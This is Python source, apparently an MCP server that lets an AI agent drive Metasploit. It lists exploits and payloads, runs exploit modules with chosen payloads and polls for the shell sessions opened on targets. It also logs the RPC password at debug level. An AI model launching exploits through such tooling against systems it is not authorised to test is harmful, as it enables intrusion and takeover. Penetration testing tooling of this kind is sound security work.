# -*- coding: utf-8 -*-
import asyncio
import base64
import contextlib
import logging
import os
import pathlib
import re
import shlex
import socket
import subprocess
import sys
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple, Union

# --- Third-party Libraries ---
import uvicorn
from fastapi import FastAPI, HTTPException, Request, Response
from mcp.server.fastmcp import FastMCP
from mcp.server.sse import SseServerTransport
from pymetasploit3.msfrpc import MsfConsole, MsfRpcClient, MsfRpcError
from starlette.applications import Starlette
from starlette.routing import Mount, Route, Router

# --- Configuration & Constants ---

# Metasploit Connection Config (from environment variables)
MSF_PASSWORD = os.getenv('MSF_PASSWORD', 'yourpassword')
MSF_SERVER = os.getenv('MSF_SERVER', '127.0.0.1')
MSF_PORT_STR = os.getenv('MSF_PORT', '55553')
MSF_SSL_STR = os.getenv('MSF_SSL', 'false')
PAYLOAD_SAVE_DIR = os.getenv('PAYLOAD_SAVE_DIR', str(pathlib.Path.home() / "payloads"))
LOG_LEVEL = os.getenv('LOG_LEVEL', 'info')

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
)
logger = logging.getLogger("metasploit_mcp_server")
logger.setLevel(LOG_LEVEL.upper())
logger.debug(f"MSF_PASSWORD    : {MSF_PASSWORD}")
logger.debug(f"MSF_SERVER      : {MSF_SERVER}")
logger.debug(f"MSF_PORT_STR    : {MSF_PORT_STR}")
logger.debug(f"MSF_SSL_STR     : {MSF_SSL_STR}")
logger.debug(f"PAYLOAD_SAVE_DIR: {PAYLOAD_SAVE_DIR}")
logger.debug(f"LOG_LEVEL       : {LOG_LEVEL}")

session_shell_type: Dict[str, str] = {}

# Timeouts and Polling Intervals (in seconds)
DEFAULT_CONSOLE_READ_TIMEOUT = 15  # Default for quick console commands
LONG_CONSOLE_READ_TIMEOUT = 60   # For commands like run/exploit/check
SESSION_COMMAND_TIMEOUT = 60     # Default for commands within sessions
SESSION_READ_INACTIVITY_TIMEOUT = 10 # Timeout if no data from session
EXPLOIT_SESSION_POLL_TIMEOUT = 60 # Max time to wait for session after exploit job
EXPLOIT_SESSION_POLL_INTERVAL = 2  # How often to check for session
RPC_CALL_TIMEOUT = 30  # Default timeout for RPC calls like listing modules

# Regular Expressions for Prompt Detection
MSF_PROMPT_RE = re.compile(rb'\x01\x02msf\d+\x01\x02 \x01\x02> \x01\x02') # Matches the msf6 > prompt with control chars
SHELL_PROMPT_RE = re.compile(r'([#$>]|%)\s*$') # Matches common shell prompts (#, $, >, %) at end of line

# --- Metasploit Client Setup ---

_msf_client_instance: Optional[MsfRpcClient] = None

def initialize_msf_client() -> MsfRpcClient:
    """
    Initializes the global Metasploit RPC client instance.
    Raises exceptions on failure.
    """
    global _msf_client_instance
    if _msf_client_instance is not None:
        return _msf_client_instance

    logger.info("Attempting to initialize Metasploit RPC client...")

    try:
        msf_port = int(MSF_PORT_STR)
        msf_ssl = MSF_SSL_STR.lower() == 'true'
    except ValueError as e:
        logger.error(f"Invalid MSF connection parameters (PORT: {MSF_PORT_STR}, SSL: {MSF_SSL_STR}). Error: {e}")
        raise ValueError("Invalid MSF connection parameters") from e

    try:
        logger.debug(f"Attempting to create MsfRpcClient connection to {MSF_SERVER}:{msf_port} (SSL: {msf_ssl})...")
        client = MsfRpcClient(
            password=MSF_PASSWORD,
            server=MSF_SERVER,
            port=msf_port,
            ssl=msf_ssl
        )
        # Test connection during initialization
        logger.debug("Testing connection with core.version call...")
        version_info = client.core.version
        msf_version = version_info.get('version', 'unknown') if isinstance(version_info, dict) else 'unknown'
        logger.info(f"Successfully connected to Metasploit RPC at {MSF_SERVER}:{msf_port} (SSL: {msf_ssl}), version: {msf_version}")
        _msf_client_instance = client
        return _msf_client_instance
    except MsfRpcError as e:
        logger.error(f"Failed to connect or authenticate to Metasploit RPC ({MSF_SERVER}:{msf_port}, SSL: {msf_ssl}): {e}")
        raise ConnectionError(f"Failed to connect/authenticate to Metasploit RPC: {e}") from e
    except Exception as e:
        logger.error(f"An unexpected error occurred during MSF client initialization: {e}", exc_info=True)
        raise RuntimeError(f"Unexpected error initializing MSF client: {e}") from e

def get_msf_client() -> MsfRpcClient:
    """Gets the initialized MSF client instance, raising an error if not ready."""
    if _msf_client_instance is None:
        logger.error("Metasploit client has not been initialized. Check MSF server connection.")
        raise ConnectionError("Metasploit client has not been initialized.") # Strict check preferred
    logger.debug("Retrieved MSF client instance successfully.")
    return _msf_client_instance

async def check_msf_connection() -> Dict[str, Any]:
    """
    Check the current status of the Metasploit RPC connection.
    Returns connection status information for debugging.
    """
    try:
        client = get_msf_client()
        logger.debug(f"Testing MSF connection with {RPC_CALL_TIMEOUT}s timeout...")
        version_info = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.core.version),
            timeout=RPC_CALL_TIMEOUT
        )
        msf_version = version_info.get('version', 'N/A') if isinstance(version_info, dict) else 'N/A'
        return {
            "status": "connected",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "version": msf_version,
            "message": "Connection to Metasploit RPC is healthy"
        }
    except asyncio.TimeoutError:
        return {
            "status": "timeout",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "timeout_seconds": RPC_CALL_TIMEOUT,
            "message": f"Metasploit server not responding within {RPC_CALL_TIMEOUT}s timeout"
        }
    except ConnectionError as e:
        return {
            "status": "not_initialized",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "message": f"Metasploit client not initialized: {e}"
        }
    except MsfRpcError as e:
        return {
            "status": "rpc_error",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "message": f"Metasploit RPC error: {e}"
        }
    except Exception as e:
        return {
            "status": "error",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "message": f"Unexpected error: {e}"
        }

@contextlib.asynccontextmanager
async def get_msf_console() -> MsfConsole:
    """
    Async context manager for creating and reliably destroying an MSF console.
    """
    client = get_msf_client() # Raises ConnectionError if not initialized
    console_object: Optional[MsfConsole] = None
    console_id_str: Optional[str] = None
    try:
        logger.debug("Creating temporary MSF console...")
        # Create console object directly
        console_object = await asyncio.to_thread(lambda: client.consoles.console())

        # Get ID using .cid attribute
        if isinstance(console_object, MsfConsole) and hasattr(console_object, 'cid'):
            console_id_val = getattr(console_object, 'cid')
            console_id_str = str(console_id_val) if console_id_val is not None else None
            if not console_id_str:
                raise ValueError("Console object created, but .cid attribute is empty or None.")
            logger.info(f"MSF console created (ID: {console_id_str})")

            # Read initial prompt/banner to clear buffer and ensure readiness
            await asyncio.sleep(0.2) # Short delay for prompt to appear
            initial_read = await asyncio.to_thread(lambda: console_object.read())
            logger.debug(f"Initial console read (clearing buffer): {initial_read}")
            yield console_object # Yield the ready console object
        else:
            # This case should ideally not happen if .console() works as expected
            logger.error(f"client.consoles.console() did not return expected MsfConsole object with .cid. Got type: {type(console_object)}")
            raise MsfRpcError(f"Unexpected result from console creation: {console_object}")

    except MsfRpcError as e:
        logger.error(f"MsfRpcError during console operation: {e}")
        raise MsfRpcError(f"Error creating/accessing MSF console: {e}") from e
    except Exception as e:
        logger.exception("Unexpected error during console creation/setup")
        raise RuntimeError(f"Unexpected error during console operation: {e}") from e
    finally:
        # Destruction Logic
        if console_id_str and _msf_client_instance: # Check client still exists
            try:
                logger.info(f"Attempting to destroy Metasploit console (ID: {console_id_str})...")
                # Use lambda to avoid potential issues with capture
                destroy_result = await asyncio.to_thread(
                    lambda cid=console_id_str: _msf_client_instance.consoles.destroy(cid)
                )
                logger.debug(f"Console destroy result: {destroy_result}")
            except Exception as e:
                # Log error but don't raise exception during cleanup
                logger.error(f"Error destroying MSF console {console_id_str}: {e}")
        elif console_object and not console_id_str:
             logger.warning("Console object created but no valid ID obtained, cannot explicitly destroy.")
        # else: logger.debug("No console ID obtained, skipping destruction.")

async def run_command_safely(console: MsfConsole, cmd: str, execution_timeout: Optional[int] = None) -> str:
    """
    Safely run a command on a Metasploit console and return the output.
    Relies primarily on detecting the MSF prompt for command completion.

    Args:
        console: The Metasploit console object (MsfConsole).
        cmd: The command to run.
        execution_timeout: Optional specific timeout for this command's execution phase.

    Returns:
        The command output as a string.
    """
    if not (hasattr(console, 'write') and hasattr(console, 'read')):
        logger.error(f"Console object {type(console)} lacks required methods (write, read).")
        raise TypeError("Unsupported console object type for command execution.")

    try:
        logger.debug(f"Running console command: {cmd}")
        await asyncio.to_thread(lambda: console.write(cmd + '\n'))

        output_buffer = b"" # Read as bytes to handle potential encoding issues and prompt matching
        start_time = asyncio.get_event_loop().time()

        # Determine read timeout - use inactivity timeout as fallback
        read_timeout = execution_timeout or (LONG_CONSOLE_READ_TIMEOUT if cmd.strip().startswith(("run", "exploit", "check")) else DEFAULT_CONSOLE_READ_TIMEOUT)
        check_interval = 0.1 # Seconds between reads
        last_data_time = start_time

        while True:
            await asyncio.sleep(check_interval)
            current_time = asyncio.get_event_loop().time()

            # Check overall timeout first
            if (current_time - start_time) > read_timeout:
                 logger.warning(f"Overall timeout ({read_timeout}s) reached for console command '{cmd}'.")
                 break

            # Read available data
            try:
                chunk_result = await asyncio.to_thread(lambda: console.read())
                # console.read() returns {'data': '...', 'prompt': '...', 'busy': bool}
                chunk_data = chunk_result.get('data', '').encode('utf-8', errors='replace') # Ensure bytes

                # Handle the prompt - ensure it's bytes for pattern matching
                prompt_str = chunk_result.get('prompt', '')
                prompt_bytes = prompt_str.encode('utf-8', errors='replace') if isinstance(prompt_str, str) else prompt_str
            except Exception as read_err:
                logger.warning(f"Error reading from console during command '{cmd}': {read_err}")
                await asyncio.sleep(0.5) # Wait a bit before retrying or timing out
                continue

            if chunk_data:
                # logger.debug(f"Read chunk (bytes): {chunk_data[:100]}...") # Log sparingly
                output_buffer += chunk_data
                last_data_time = current_time # Reset inactivity timer

                # Primary Completion Check: Did we receive the prompt?
                if prompt_bytes and MSF_PROMPT_RE.search(prompt_bytes):
                     logger.debug(f"Detected MSF prompt in console.read() result for '{cmd}'. Command likely complete.")
                     break
                # Secondary Check: Does the buffered output end with the prompt?
                # Needed if prompt wasn't in the last read chunk but arrived earlier.
                if MSF_PROMPT_RE.search(output_buffer):
                     logger.debug(f"Detected MSF prompt at end of buffer for '{cmd}'. Command likely complete.")
                     break

            # Fallback Completion Check: Inactivity timeout
            elif (current_time - last_data_time) > SESSION_READ_INACTIVITY_TIMEOUT: # Use a shorter inactivity timeout here
                logger.debug(f"Console inactivity timeout ({SESSION_READ_INACTIVITY_TIMEOUT}s) reached for command '{cmd}'. Assuming complete.")
                break

        # Decode the final buffer
        final_output = output_buffer.decode('utf-8', errors='replace').strip()
        logger.debug(f"Final output for '{cmd}' (length {len(final_output)}):\n{final_output[:500]}{'...' if len(final_output) > 500 else ''}")
        return final_output

    except Exception as e:
        logger.exception(f"Error executing console command '{cmd}'")
        raise RuntimeError(f"Failed executing console command '{cmd}': {e}") from e

from mcp.server.session import ServerSession

####################################################################################
# Temporary monkeypatch which avoids crashing when a POST message is received
# before a connection has been initialized, e.g: after a deployment.
# pylint: disable-next=protected-access
old__received_request = ServerSession._received_request


async def _received_request(self, *args, **kwargs):
    try:
        return await old__received_request(self, *args, **kwargs)
    except RuntimeError:
        pass


# pylint: disable-next=protected-access
ServerSession._received_request = _received_request
####################################################################################

# --- MCP Server Initialization ---
mcp = FastMCP("Metasploit Tools Enhanced (Streamlined)")

# --- Internal Helper Functions ---

def _parse_options_gracefully(options: Union[Dict[str, Any], str, None]) -> Dict[str, Any]:
    """
    Gracefully parse options from different formats.
    
    Handles:
    - Dict format (correct): {"key": "value", "key2": "value2"}
    - String format (common mistake): "key=value,key=value"
    - None: returns empty dict
    
    Args:
        options: Options in dict format, string format, or None
        
    Returns:
        Dictionary of parsed options
        
    Raises:
        ValueError: If string format is malformed
    """
    if options is None:
        return {}
    
    if isinstance(options, dict):
        # Already correct format
        return options
    
    if isinstance(options, str):
        # Handle the common mistake format: "key=value,key=value"
        if not options.strip():
            return {}
            
        logger.info(f"Converting string format options to dict: {options}")
        parsed_options = {}
        
        try:
            # Split by comma and then by equals
            pairs = [pair.strip() for pair in options.split(',') if pair.strip()]
            for pair in pairs:
                if '=' not in pair:
                    raise ValueError(f"Invalid option format: '{pair}' (missing '=')")
                
                key, value = pair.split('=', 1)  # Split only on first '='
                key = key.strip()
                value = value.strip()
                
                # Validate key is not empty
                if not key:
                    raise ValueError(f"Invalid option format: '{pair}' (empty key)")
                
                # Remove quotes if they wrap the entire value
                if (value.startswith('"') and value.endswith('"')) or \
                   (value.startswith("'") and value.endswith("'")):
                    value = value[1:-1]
                
                # Basic type conversion
                if value.lower() in ('true', 'false'):
                    value = value.lower() == 'true'
                elif value.isdigit():
                    try:
                        value = int(value)
                    except ValueError:
                        pass  # Keep as string if conversion fails
                
                parsed_options[key] = value
            
            logger.info(f"Successfully converted string options to dict: {parsed_options}")
            return parsed_options
            
        except Exception as e:
            raise ValueError(f"Failed to parse options string '{options}': {e}. Expected format: 'key=value,key2=value2' or dict {{'key': 'value'}}")
    
    # For any other type, try to convert to dict
    try:
        return dict(options)
    except (TypeError, ValueError) as e:
        raise ValueError(f"Options must be a dictionary or comma-separated string format 'key=value,key2=value2'. Got {type(options)}: {options}")

async def _get_module_object(module_type: str, module_name: str) -> Any:
    """Gets the MSF module object, handling potential path variations."""
    client = get_msf_client()
    base_module_name = module_name # Start assuming it's the base name
    if '/' in module_name:
        parts = module_name.split('/')
        if parts[0] in ('exploit', 'payload', 'post', 'auxiliary', 'encoder', 'nop'):
             # Looks like full path, extract base name
             base_module_name = '/'.join(parts[1:])
             if module_type != parts[0]:
                 logger.warning(f"Module type mismatch: expected '{module_type}', got path starting with '{parts[0]}'. Using provided type.")
        # Else: Assume it's like 'windows/smb/ms17_010_eternalblue' - already the base name

    logger.debug(f"Attempting to retrieve module: client.modules.use('{module_type}', '{base_module_name}')")
    try:
        module_obj = await asyncio.to_thread(lambda: client.modules.use(module_type, base_module_name))
        logger.debug(f"Successfully retrieved module object for {module_type}/{base_module_name}")
        return module_obj
    except (MsfRpcError, KeyError) as e:
        # KeyError can be raised by pymetasploit3 if module not found
        error_str = str(e).lower()
        if "unknown module" in error_str or "invalid module" in error_str or isinstance(e, KeyError):
             logger.error(f"Module {module_type}/{base_module_name} (from input {module_name}) not found.")
             raise ValueError(f"Module '{module_name}' of type '{module_type}' not found.") from e
        else:
             logger.error(f"MsfRpcError getting module {module_type}/{base_module_name}: {e}")
             raise MsfRpcError(f"Error retrieving module '{module_name}': {e}") from e

async def _set_module_options(module_obj: Any, options: Dict[str, Any]):
    """Sets options on a module object, performing basic type guessing."""
    logger.debug(f"Setting options for module {getattr(module_obj, 'fullname', '')}: {options}")
    for k, v in options.items():
        # Basic type guessing
        original_value = v
        if isinstance(v, str):
            if v.isdigit():
                try: v = int(v)
                except ValueError: pass # Keep as string if large number or non-integer
            elif v.lower() in ('true', 'false'):
                v = v.lower() == 'true'
            # Add more specific checks if needed (e.g., for file paths)
        elif isinstance(v, (int, bool)):
            pass # Already correct type
        # Add handling for other types like lists if necessary

        try:
            # Use lambda to capture current k, v for the thread
            await asyncio.to_thread(lambda key=k, value=v: module_obj.__setitem__(key, value))
            # logger.debug(f"Set option {k}={v} (original: {original_value})")
        except (MsfRpcError, KeyError, TypeError) as e:
             # Catch potential errors if option doesn't exist or type is wrong
             logger.error(f"Failed to set option {k}={v} on module: {e}")
             raise ValueError(f"Failed to set option '{k}' to '{original_value}': {e}") from e

async def _execute_module_rpc(
    module_type: str,
    module_name: str, # Can be full path or base name
    module_options: Dict[str, Any],
    payload_spec: Optional[Union[str, Dict[str, Any]]] = None # Payload name or {name: ..., options: ...}
) -> Dict[str, Any]:
    """
    Helper to execute an exploit, auxiliary, or post module as a background job via RPC.
    Includes polling logic for exploit sessions.
    """
    client = get_msf_client()
    module_obj = await _get_module_object(module_type, module_name) # Handles path variants
    full_module_path = getattr(module_obj, 'fullname', f"{module_type}/{module_name}") # Get canonical name

    await _set_module_options(module_obj, module_options)

    payload_obj_to_pass = None
    payload_name_for_log = None
    payload_options_for_log = None

    # Prepare payload if needed (primarily for exploits, also used by start_listener)
    if module_type == 'exploit' and payload_spec:
        if isinstance(payload_spec, str):
             payload_name_for_log = payload_spec
             # Passing name string directly is supported by exploit.execute
             payload_obj_to_pass = payload_name_for_log
             logger.info(f"Executing {full_module_path} with payload '{payload_name_for_log}' (passed as string).")
        elif isinstance(payload_spec, dict) and 'name' in payload_spec:
             payload_name = payload_spec['name']
             payload_options = payload_spec.get('options', {})
             payload_name_for_log = payload_name
             payload_options_for_log = payload_options
             try:
                 payload_obj = await _get_module_object('payload', payload_name)
                 await _set_module_options(payload_obj, payload_options)
                 payload_obj_to_pass = payload_obj # Pass the configured payload object
                 logger.info(f"Executing {full_module_path} with configured payload object for '{payload_name}'.")
             except (ValueError, MsfRpcError) as e:
                 logger.error(f"Failed to prepare payload object for '{payload_name}': {e}")
                 return {"status": "error", "message": f"Failed to prepare payload '{payload_name}': {e}"}
        else:
             logger.warning(f"Invalid payload_spec format: {payload_spec}. Expected string or dict with 'name'.")
             return {"status": "error", "message": "Invalid payload specification format."}

    logger.info(f"Executing module {full_module_path} as background job via RPC...")
    try:
        if module_type == 'exploit':
            exec_result = await asyncio.to_thread(lambda: module_obj.execute(payload=payload_obj_to_pass))
        else: # auxiliary, post
            exec_result = await asyncio.to_thread(lambda: module_obj.execute())

        logger.info(f"RPC execute() result for {full_module_path}: {exec_result}")

        # --- Process Execution Result ---
        if not isinstance(exec_result, dict):
            logger.error(f"Unexpected result type from {module_type} execution: {type(exec_result)} - {exec_result}")
            return {"status": "error", "message": f"Unexpected result from module execution: {exec_result}", "module": full_module_path}

        if exec_result.get('error', False):
            error_msg = exec_result.get('error_message', exec_result.get('error_string', 'Unknown RPC error during execution'))
            logger.error(f"Failed to start job for {full_module_path}: {error_msg}")
            # Check for common errors
            if "could not bind" in error_msg.lower():
                return {"status": "error", "message": f"Job start failed: Address/Port likely already in use. {error_msg}", "module": full_module_path}
            return {"status": "error", "message": f"Failed to start job: {error_msg}", "module": full_module_path}

        job_id = exec_result.get('job_id')
        uuid = exec_result.get('uuid')

        if job_id is None:
            logger.warning(f"{module_type.capitalize()} job executed but no job_id returned: {exec_result}")
            # Sometimes handlers don't return job_id but are running, check by UUID/name later maybe
            if module_type == 'exploit' and 'handler' in full_module_path:
                 # Check jobs list for a match based on payload/lhost/lport
                 await asyncio.sleep(1.0)
                 jobs_list = await asyncio.to_thread(lambda: client.jobs.list)
                 for jid, jinfo in jobs_list.items():
                     if isinstance(jinfo, dict) and jinfo.get('name','').endswith('Handler') and \
                        jinfo.get('datastore',{}).get('LHOST') == module_options.get('LHOST') and \
                        jinfo.get('datastore',{}).get('LPORT') == module_options.get('LPORT') and \
                        jinfo.get('datastore',{}).get('PAYLOAD') == payload_name_for_log:
                          logger.info(f"Found probable handler job {jid} matching parameters.")
                          return {"status": "success", "message": f"Listener likely started as job {jid}", "job_id": jid, "uuid": uuid, "module": full_module_path}

            return {"status": "unknown", "message": f"{module_type.capitalize()} executed, but no job ID returned.", "result": exec_result, "module": full_module_path}

        # --- Exploit Specific: Poll for Session ---
        found_session_id = None
        if module_type == 'exploit' and uuid:
             start_time = asyncio.get_event_loop().time()
             logger.info(f"Exploit job {job_id} (UUID: {uuid}) started. Polling for session (timeout: {EXPLOIT_SESSION_POLL_TIMEOUT}s)...")
             while (asyncio.get_event_loop().time() - start_time) < EXPLOIT_SESSION_POLL_TIMEOUT:
                 try:
                     sessions_list = await asyncio.to_thread(lambda: client.sessions.list)
                     for s_id, s_info in sessions_list.items():
                         # Ensure comparison is robust (uuid might be str or bytes, info dict keys too)
                         s_id_str = str(s_id)
                         if isinstance(s_info, dict) and str(s_info.get('exploit_uuid')) == str(uuid):
                             found_session_id = s_id # Keep original type from list keys
                             logger.info(f"Found matching session {found_session_id} for job {job_id} (UUID: {uuid})")
                             break # Exit inner loop

                     if found_session_id is not None: break # Exit outer loop

                     # Optional: Check if job died prematurely
                     # job_info = await asyncio.to_thread(lambda: client.jobs.info(str(job_id)))
                     # if not job_info or job_info.get('status') != 'running':
                     #     logger.warning(f"Job {job_id} stopped or disappeared during session polling.")
                     #     break

                 except MsfRpcError as poll_e: logger.warning(f"Error during session polling: {poll_e}")
                 except Exception as poll_e: logger.error(f"Unexpected error during polling: {poll_e}", exc_info=True); break

                 await asyncio.sleep(EXPLOIT_SESSION_POLL_INTERVAL)

             if found_session_id is None:
                 logger.warning(f"Polling timeout ({EXPLOIT_SESSION_POLL_TIMEOUT}s) reached for job {job_id}, no matching session found.")

        # --- Construct Final Success/Warning Message ---
        message = f"{module_type.capitalize()} module {full_module_path} started as job {job_id}."
        status = "success"
        if module_type == 'exploit':
            if found_session_id is not None:
                 message += f" Session {found_session_id} created."
            else:
                 message += " No session detected within timeout."
                 status = "warning" # Indicate job started but session didn't appear

        return {
            "status": status, "message": message, "job_id": job_id, "uuid": uuid,
            "session_id": found_session_id, # None if not found/not applicable
            "module": full_module_path, "options": module_options,
            "payload_name": payload_name_for_log, # Include payload info if exploit
            "payload_options": payload_options_for_log
        }

    except (MsfRpcError, ValueError) as e: # Catch module prep errors too
        error_str = str(e).lower()
        logger.error(f"Error executing module {full_module_path} via RPC: {e}")
        if "missing required option" in error_str or "invalid option" in error_str:
             missing = getattr(module_obj, 'missing_required', [])
             return {"status": "error", "message": f"Missing/invalid options for {full_module_path}: {e}", "missing_required": missing}
        elif "invalid payload" in error_str:
             return {"status": "error", "message": f"Invalid payload specified: {payload_name_for_log or 'None'}. {e}"}
        return {"status": "error", "message": f"Error running {full_module_path}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error executing module {full_module_path} via RPC")
        return {"status": "error", "message": f"Unexpected server error running {full_module_path}: {e}"}

async def _execute_module_console(
    module_type: str,
    module_name: str, # Can be full path or base name
    module_options: Dict[str, Any],
    command: str, # Typically 'exploit', 'run', or 'check'
    payload_spec: Optional[Union[str, Dict[str, Any]]] = None,
    timeout: int = LONG_CONSOLE_READ_TIMEOUT
) -> Dict[str, Any]:
    """Helper to execute a module synchronously via console."""
    # Determine full path needed for 'use' command
    if '/' not in module_name:
         full_module_path = f"{module_type}/{module_name}"
    else:
         # Assume full path or relative path was given; ensure type prefix
         if not module_name.startswith(module_type + '/'):
             # e.g., got 'windows/x', type 'exploit' -> 'exploit/windows/x'
             # e.g., got 'exploit/windows/x', type 'exploit' -> 'exploit/windows/x' (no change)
             if not any(module_name.startswith(pfx + '/') for pfx in ['exploit', 'payload', 'post', 'auxiliary', 'encoder', 'nop']):
                  full_module_path = f"{module_type}/{module_name}"
             else: # Already has a type prefix, use it as is
                   full_module_path = module_name
         else: # Starts with correct type prefix
             full_module_path = module_name

    logger.info(f"Executing {full_module_path} synchronously via console (command: {command})...")

    payload_name_for_log = None
    payload_options_for_log = None

    async with get_msf_console() as console:
        try:
            setup_commands = [f"use {full_module_path}"]

            # Add module options
            for key, value in module_options.items():
                val_str = str(value)
                if isinstance(value, str) and any(c in val_str for c in [' ', '"', "'", '\\']):
                    val_str = shlex.quote(val_str)
                elif isinstance(value, bool):
                    val_str = str(value).lower() # MSF console expects lowercase bools
                setup_commands.append(f"set {key} {val_str}")

            # Add payload and payload options (if applicable)
            if payload_spec:
                payload_name = None
                payload_options = {}
                if isinstance(payload_spec, str):
                    payload_name = payload_spec
                elif isinstance(payload_spec, dict) and 'name' in payload_spec:
                    payload_name = payload_spec['name']
                    payload_options = payload_spec.get('options', {})

                if payload_name:
                    payload_name_for_log = payload_name
                    payload_options_for_log = payload_options
                    # Need base name for 'set PAYLOAD'
                    if '/' in payload_name:
                        parts = payload_name.split('/')
                        if parts[0] == 'payload': payload_base_name = '/'.join(parts[1:])
                        else: payload_base_name = payload_name # Assume relative
                    else: payload_base_name = payload_name # Assume just name

                    setup_commands.append(f"set PAYLOAD {payload_base_name}")
                    for key, value in payload_options.items():
                        val_str = str(value)
                        if isinstance(value, str) and any(c in val_str for c in [' ', '"', "'", '\\']):
                            val_str = shlex.quote(val_str)
                        elif isinstance(value, bool):
                            val_str = str(value).lower()
                        setup_commands.append(f"set {key} {val_str}")

            # Execute setup commands
            for cmd in setup_commands:
                setup_output = await run_command_safely(console, cmd, execution_timeout=DEFAULT_CONSOLE_READ_TIMEOUT)
                # Basic error check in setup output
                if any(err in setup_output for err in ["[-] Error setting", "Invalid option", "Unknown module", "Failed to load"]):
                    error_msg = f"Error during setup command '{cmd}': {setup_output}"
                    logger.error(error_msg)
                    return {"status": "error", "message": error_msg, "module": full_module_path}
                await asyncio.sleep(0.1) # Small delay between setup commands

            # Execute the final command (exploit, run, check)
            logger.info(f"Running final console command: {command}")
            module_output = await run_command_safely(console, command, execution_timeout=timeout)
            logger.debug(f"Synchronous execution output length: {len(module_output)}")

            # --- Parse Console Output ---
            session_id = None
            session_opened_line = ""
            # More robust session detection pattern
            session_match = re.search(r"(?:meterpreter|command shell)\s+session\s+(\d+)\s+opened", module_output, re.IGNORECASE)
            if session_match:
                 try:
                     session_id = int(session_match.group(1))
                     session_opened_line = session_match.group(0) # The matched line segment
                     logger.info(f"Detected session {session_id} opened in console output.")
                 except (ValueError, IndexError):
                     logger.warning("Found session opened pattern, but failed to parse ID.")

            status = "success"
            message = f"{module_type.capitalize()} module {full_module_path} completed via console ({command})."
            if command in ['exploit', 'run'] and session_id is None and \
               any(term in module_output.lower() for term in ['session opened', 'sending stage']):
                 message += " Session may have opened but ID detection failed or session closed quickly."
                 status = "warning"
            elif command in ['exploit', 'run'] and session_id is not None:
                 message += f" Session {session_id} detected."

            # Check for common failure indicators
            if any(fail in module_output.lower() for fail in ['exploit completed, but no session was created', 'exploit failed', 'run failed', 'check failed', 'module check failed']):
                 status = "error" if status != "warning" else status # Don't override warning if session might have opened
                 message = f"{module_type.capitalize()} module {full_module_path} execution via console appears to have failed. Check output."
                 logger.error(f"Failure detected in console output for {full_module_path}.")


            return {
                 "status": status,
                 "message": message,
                 "module_output": module_output,
                 "session_id_detected": session_id,
                 "session_opened_line": session_opened_line,
                 "module": full_module_path,
                 "options": module_options,
                 "payload_name": payload_name_for_log,
                 "payload_options": payload_options_for_log
            }

        except (RuntimeError, MsfRpcError, ValueError) as e: # Catch errors from run_command_safely or setup
            logger.error(f"Error during console execution of {full_module_path}: {e}")
            return {"status": "error", "message": f"Error executing {full_module_path} via console: {e}"}
        except Exception as e:
            logger.exception(f"Unexpected error during console execution of {full_module_path}")
            return {"status": "error", "message": f"Unexpected server error running {full_module_path} via console: {e}"}

# --- MCP Tool Definitions ---

@mcp.tool()
async def list_exploits(search_term: str = "") -> List[str]:
    """
    List available Metasploit exploits, optionally filtered by search term.

    Args:
        search_term: Optional term to filter exploits (case-insensitive).

    Returns:
        List of exploit names matching the term (max 200), or top 100 if no term.
    """
    client = get_msf_client()
    logger.info(f"Listing exploits (search term: '{search_term or 'None'}')")
    try:
        # Add timeout to prevent hanging on slow/unresponsive MSF server
        logger.debug(f"Calling client.modules.exploits with {RPC_CALL_TIMEOUT}s timeout...")
        exploits = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.modules.exploits),
            timeout=RPC_CALL_TIMEOUT
        )
        logger.debug(f"Retrieved {len(exploits)} total exploits from MSF.")
        if search_term:
            term_lower = search_term.lower()
            filtered_exploits = [e for e in exploits if term_lower in e.lower()]
            count = len(filtered_exploits)
            limit = 200
            logger.info(f"Found {count} exploits matching '{search_term}'. Returning max {limit}.")
            return filtered_exploits[:limit]
        else:
            limit = 100
            logger.info(f"No search term provided, returning first {limit} exploits.")
            return exploits[:limit]
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing exploits from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return [f"Error: {error_msg}"]
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing exploits: {e}")
        return [f"Error: Metasploit RPC error: {e}"]
    except Exception as e:
        logger.exception("Unexpected error listing exploits.")
        return [f"Error: Unexpected error listing exploits: {e}"]

@mcp.tool()
async def list_payloads(platform: str = "", arch: str = "") -> List[str]:
    """
    List available Metasploit payloads, optionally filtered by platform and/or architecture.

    Args:
        platform: Optional platform filter (e.g., 'windows', 'linux', 'python', 'php').
        arch: Optional architecture filter (e.g., 'x86', 'x64', 'cmd', 'meterpreter').

    Returns:
        List of payload names matching filters (max 100).
    """
    client = get_msf_client()
    logger.info(f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}')")
    try:
        # Add timeout to prevent hanging on slow/unresponsive MSF server
        logger.debug(f"Calling client.modules.payloads with {RPC_CALL_TIMEOUT}s timeout...")
        payloads = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.modules.payloads),
            timeout=RPC_CALL_TIMEOUT
        )
        logger.debug(f"Retrieved {len(payloads)} total payloads from MSF.")
        filtered = payloads
        if platform:
            plat_lower = platform.lower()
            # Match platform at the start of the payload path segment or within common paths
            filtered = [p for p in filtered if p.lower().startswith(plat_lower + '/') or f"/{plat_lower}/" in p.lower()]
        if arch:
            arch_lower = arch.lower()
            # Match architecture more flexibly (e.g., '/x64/', 'meterpreter')
            filtered = [p for p in filtered if f"/{arch_lower}/" in p.lower() or arch_lower in p.lower().split('/')]

        count = len(filtered)
        limit = 100
        logger.info(f"Found {count} payloads matching filters. Returning max {limit}.")
        return filtered[:limit]
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing payloads from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return [f"Error: {error_msg}"]
